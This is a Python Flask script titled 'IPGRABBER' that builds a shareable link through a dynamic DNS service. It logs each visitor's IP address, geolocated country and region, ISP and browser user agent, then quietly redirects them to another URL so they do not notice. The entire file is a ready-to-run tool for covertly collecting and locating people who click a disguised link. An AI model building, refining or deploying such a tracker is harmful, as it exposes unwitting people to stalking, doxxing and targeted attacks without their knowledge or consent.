import os
import sys
import logging
import pyfiglet

from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, redirect, request
from requests import get

load_dotenv()

logging.getLogger('werkzeug').disabled = True
os.environ['WERKZEUG_RUN_MAIN'] = 'true'

logger = logging.getLogger(__name__)

app = Flask(__name__)


def get_public_ip():
    return get('https://api.ipify.org').content.decode('utf8')

def get_noip_link():
    public_ip = get_public_ip()

    noip_user = os.environ.get('NOIP_USERNAME')
    noip_pass = os.environ.get('NOIP_PASSWORD')
    noip_host = os.environ.get('NOIP_HOSTNAME')

    res = get(url=f'http://{noip_user}:{noip_pass}@dynupdate.no-ip.com/nic/update?hostname={noip_host}&myip={public_ip}:8080')

    res.raise_for_status()

    return f'http://{noip_host}'

def print_header():
    print(f'{pyfiglet.figlet_format("IPGRABBER")}By Ivan Galvez\n')
    print(f'Link to share: {get_noip_link()}\n')
    print(f'Connections:')


@app.route('/')
def index():
    datenow = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    response = get(
        headers={'User-Agent': 'keycdn-tools:https://www.example.com'},
        url=f'https://tools.keycdn.com/geo.json?host={request.remote_addr}'
    )

    response.raise_for_status()

    data = response.json()

    if data['status'] == 'success':
        ip_data = data['data']['geo']
        ip_data['user_agent'] = request.user_agent
        ip_data['datetime'] = datenow

        print(f"[{datenow}] {ip_data['ip']} - {ip_data['country_name']} - {ip_data['region_name']} - {ip_data['isp']} - {ip_data['user_agent']}")

    return redirect(sys.argv[1])


if __name__ == '__main__':

    print_header()

    app.run(host='0.0.0.0', port=8080)
